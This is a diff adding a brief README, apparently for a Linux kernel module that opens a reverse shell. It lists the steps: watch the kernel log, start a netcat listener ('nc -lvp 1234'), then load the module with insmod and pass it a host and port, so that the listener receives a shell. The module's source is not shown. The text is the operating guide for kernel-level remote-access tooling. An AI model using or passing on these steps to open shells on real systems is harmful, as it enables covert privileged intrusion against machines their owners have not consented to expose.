@@ -1,0 +1,12 @@
+To run, and view this driver- you will need to:
+
+1. Use tail to watch the kernel log:
+  sudo tail -f /var/log/kern.log
+
+2. Set up a listener, e.g. netcat on the port you will later specify
+  nc -lvp 1234
+
+3. Use insmod to load the driver.ko:
+  sudo insmod lkm_reverse_device.ko host="ADDR=127.0.0.1" port="PORT=1234"
+
+4. After loading the device, you should have a shell in your listener
